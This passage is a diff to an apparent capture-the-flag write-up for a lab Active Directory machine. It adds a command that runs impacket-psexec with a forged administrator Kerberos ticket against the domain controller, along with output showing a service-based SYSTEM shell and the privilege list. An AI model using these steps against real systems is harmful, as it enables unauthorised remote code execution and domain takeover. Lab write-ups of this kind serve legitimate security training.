@@ -541,3 +541,64 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 I now have a ticket for the administrator
 
 Both winrm and RDP are shut in this instance so ill have to use wmiexec or psexec
+
+```python
+
+```
+
+```python
+faketime -f +7h impacket-psexec -k -no-pass dc.intelligence.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.intelligence.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file vmcQqBUK.exe
+[*] Opening SVCManager on dc.intelligence.htb.....
+[*] Creating service xZWI on dc.intelligence.htb.....
+[*] Starting service xZWI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+C:\Windows\system32> 
+```
+Domain admin!
